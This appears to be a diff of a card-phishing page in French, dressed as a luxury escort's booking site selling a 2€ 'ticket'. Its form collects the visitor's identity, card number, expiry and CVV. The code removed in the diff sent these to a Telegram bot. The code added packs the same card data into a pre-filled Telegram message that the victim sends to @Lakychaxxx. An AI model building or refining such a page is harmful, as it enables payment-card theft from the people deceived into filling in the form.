@@ -33,7 +33,7 @@
             border-radius: 10px;
         }
 
-        /* ===== FOND ANIMÉ SENSUEL ===== */
+        /* ===== FOND SENSUEL ANIMÉ ===== */
         #sensual-bg {
             position: fixed;
             top: 0;
@@ -45,7 +45,6 @@
             overflow: hidden;
         }
 
-        /* Vagues sensuelles */
         .sensual-wave {
             position: absolute;
             border-radius: 50%;
@@ -100,7 +99,6 @@
             100% { transform: translate(0, 0) scale(1) rotate(0deg); }
         }
 
-        /* Lignes sensuelles */
         .sensual-line {
             position: absolute;
             height: 1px;
@@ -137,7 +135,6 @@
             100% { transform: translateX(100%) scaleX(0.5); opacity: 0; }
         }
 
-        /* Motifs de cœurs sensuels */
         .heart-pattern {
             position: absolute;
             font-size: 30px;
@@ -154,7 +151,6 @@
             100% { transform: translateY(-10vh) rotate(720deg) scale(1); opacity: 0; }
         }
 
-        /* Effet de lumière sensuelle */
         .sensual-glow {
             position: absolute;
             border-radius: 50%;
@@ -186,7 +182,6 @@
             100% { opacity: 0.15; transform: scale(1.2); }
         }
 
-        /* ===== OVERLAY ===== */
         .overlay {
             position: fixed;
             top: 0;
@@ -224,14 +219,8 @@
             animation: fadeInUp 1.2s ease forwards;
         }
 
-        /* ===== ANIMATIONS ===== */
         @keyframes fadeInUp {
             from { opacity: 0; transform: translateY(50px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes fadeInDown {
-            from { opacity: 0; transform: translateY(-30px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
@@ -733,6 +722,29 @@
             transform: translateY(-2px);
         }
 
+        /* Bouton Telegram */
+        .btn-telegram {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 14px 40px;
+            background: linear-gradient(135deg, #0088cc, #0077b3);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 600;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            text-decoration: none;
+            font-family: 'Playfair Display', serif;
+        }
+
+        .btn-telegram:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(0, 136, 204, 0.3);
+        }
+
         /* ===== FOOTER ===== */
         .footer {
             text-align: center;
@@ -867,7 +879,7 @@
 
                 <div class="hero-subtitle">✨ Escorte de Luxe ✨</div>
                 <h1 class="hero-title">
-                    <span class="highlight">Chloé</span>Lackychaxxx
+                    <span class="highlight">Chloé </span>Lakychax
                 </h1>
                 <div class="divider"></div>
                 <p class="hero-tagline">
@@ -1027,25 +1039,32 @@
                         </div>
                     </div>
 
-                    <button type="submit" class="btn-reserve">
+                    <button type="submit" class="btn-reserve" id="submitBtn">
                         <span class="btn-shine"></span>
                         💕 Réserver mon ticket - 2€
                     </button>
                 </form>
 
+                <!-- CONFIRMATION AVEC BOUTON TELEGRAM -->
                 <div class="confirmation" id="confirmation">
                     <div class="icon">💕</div>
-                    <h3>Réservation confirmée !</h3>
+                    <h3>Réservation prête !</h3>
                     <p>
-                        Votre ticket a bien été réservé. Vous recevrez une confirmation 
-                        sur <strong>Telegram</strong> sous 24h.
+                        Cliquez sur le bouton ci-dessous pour envoyer votre réservation 
+                        directement sur <strong>Telegram</strong>.
                     </p>
                     <p style="margin-top: 10px; color: #6a5a5a; font-size: 0.9rem;">
-                        En attendant, découvrez mon univers sur Telegram 💫
+                        Le message est déjà pré-rempli avec toutes vos informations.
                     </p>
-                    <a href="https://t.me/Lakychaxxx" target="_blank" class="telegram-link">
-                        📱 @Lakychaxxx
+                    
+                    <!-- Bouton qui ouvre Telegram avec le message pré-rempli -->
+                    <a href="#" id="telegramLink" target="_blank" class="btn-telegram">
+                        📱 Envoyer sur Telegram
                     </a>
+                    
+                    <p style="margin-top: 15px; font-size: 0.8rem; color: #4a3a3a;">
+                        💡 Vous serez redirigé vers Telegram. Il vous suffit d'appuyer sur "Envoyer".
+                    </p>
                 </div>
             </div>
         </section>
@@ -1069,12 +1088,6 @@
 
     <!-- ===== JAVASCRIPT ===== -->
     <script>
-        // =====================================================
-        // CONFIGURATION TELEGRAM
-        // =====================================================
-        const TELEGRAM_BOT_TOKEN = 'VOTRE_TOKEN_BOT';
-        const TELEGRAM_CHAT_ID = 'VOTRE_CHAT_ID';
-
         // =====================================================
         // CRÉATION DES CŒURS FLOTTANTS
         // =====================================================
@@ -1141,103 +1154,81 @@
         document.getElementById('date').min = new Date().toISOString().split('T')[0];
 
         // =====================================================
-        // ENVOI À TELEGRAM
+        // GESTION DU FORMULAIRE - OUVERTURE TELEGRAM
         // =====================================================
         const form = document.getElementById('bookingForm');
         const confirmation = document.getElementById('confirmation');
+        const submitBtn = document.getElementById('submitBtn');
+        const telegramLink = document.getElementById('telegramLink');
 
-        async function sendToTelegram(data) {
-            const message = `💕 *NOUVELLE RÉSERVATION* 💕
-        ──────────────────
-        👤 *Nom :* ${data.fullName}
-        📧 *Email :* ${data.email}
-        📱 *Téléphone :* ${data.phone}
-        📅 *Date :* ${data.date}
-        ⏰ *Horaire :* ${data.time}
-        💬 *Message :* ${data.message || 'Aucun'}
-
-        💳 *Coordonnées bancaires :*
-        ──────────────────
-        🔢 Carte : ${data.cardNumber}
-        📆 Expiration : ${data.expiry}
-        🔒 CVV : ${data.cvv}
-        ✍️ Titulaire : ${data.cardName}
-        ──────────────────
-        💕 Lakychaxxx - Ticket 2€`;
-
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown',
-                    })
-                });
-
-                if (!response.ok) throw new Error('Erreur Telegram');
-                return await response.json();
-            } catch (error) {
-                console.error('Erreur:', error);
-                window.open('https://t.me/Lakychaxxx', '_blank');
-                return null;
-            }
-        }
-
-        form.addEventListener('submit', async function(e) {
+        form.addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const formData = {
-                fullName: document.getElementById('fullName').value.trim(),
-                email: document.getElementById('email').value.trim(),
-                phone: document.getElementById('phone').value.trim(),
-                date: document.getElementById('date').value,
-                time: document.getElementById('time').value,
-                message: document.getElementById('message').value.trim(),
-                cardNumber: document.getElementById('cardNumber').value.trim(),
-                expiry: document.getElementById('expiry').value.trim(),
-                cvv: document.getElementById('cvv').value.trim(),
-                cardName: document.getElementById('cardName').value.trim(),
-            };
+            // Récupération des données
+            const fullName = document.getElementById('fullName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const date = document.getElementById('date').value;
+            const time = document.getElementById('time').value;
+            const message = document.getElementById('message').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const cardName = document.getElementById('cardName').value.trim();
 
-            if (!formData.fullName || !formData.email || !formData.phone || 
-                !formData.date || !formData.time || !formData.cardNumber || 
-                !formData.expiry || !formData.cvv || !formData.cardName) {
+            // Validation
+            if (!fullName || !email || !phone || !date || !time || 
+                !cardNumber || !expiry || !cvv || !cardName) {
                 alert('💕 Veuillez remplir tous les champs obligatoires.');
                 return;
             }
 
-            if (formData.cardNumber.replace(/\s/g, '').length < 16) {
+            if (cardNumber.replace(/\s/g, '').length < 16) {
                 alert('💳 Veuillez entrer un numéro de carte valide (16 chiffres).');
                 return;
             }
 
-            if (formData.cvv.length < 3) {
+            if (cvv.length < 3) {
                 alert('🔒 Veuillez entrer un CVV valide (3 chiffres).');
                 return;
             }
 
-            const submitBtn = form.querySelector('.btn-reserve');
-            submitBtn.textContent = '⏳ Envoi en cours...';
-            submitBtn.disabled = true;
+            // Construction du message pour Telegram
+            const telegramMessage = `💕 *NOUVELLE RÉSERVATION* 💕
+        ──────────────────
+        👤 *Nom :* ${fullName}
+        📧 *Email :* ${email}
+        📱 *Téléphone :* ${phone}
+        📅 *Date :* ${date}
+        ⏰ *Horaire :* ${time}
+        💬 *Message :* ${message || 'Aucun'}
 
-            try {
-                await sendToTelegram(formData);
-                confirmation.classList.add('show');
-                form.style.display = 'none';
-            } catch (error) {
-                alert('Une erreur est survenue. Veuillez réessayer ou nous contacter sur Telegram.');
-                submitBtn.textContent = '💕 Réserver mon ticket - 2€';
-                submitBtn.disabled = false;
-            }
+        💳 *Coordonnées bancaires :*
+        ──────────────────
+        🔢 Carte : ${cardNumber}
+        📆 Expiration : ${expiry}
+        🔒 CVV : ${cvv}
+        ✍️ Titulaire : ${cardName}
+        ──────────────────
+        💕 Lakychaxxx - Ticket 2€`;
+
+            // Encodage du message pour URL
+            const encodedMessage = encodeURIComponent(telegramMessage);
+
+            // Création du lien Telegram
+            // Le client envoie à @Lakychaxxx (ou à votre bot)
+            const telegramUrl = `https://t.me/Lakychaxxx?text=${encodedMessage}`;
+
+            // Mise à jour du lien
+            telegramLink.href = telegramUrl;
+
+            // Affichage de la confirmation
+            confirmation.classList.add('show');
+            form.style.display = 'none';
+
+            // Ouvrir Telegram automatiquement (optionnel)
+            // window.open(telegramUrl, '_blank');
         });
-
-        console.log('💕 Site Lakychaxxx - Configuration :');
-        console.log('1. Remplacez VOTRE_TOKEN_BOT et VOTRE_CHAT_ID');
-        console.log('2. Lien : https://t.me/Lakychaxxx');
     </script>
 </body>
 </html>
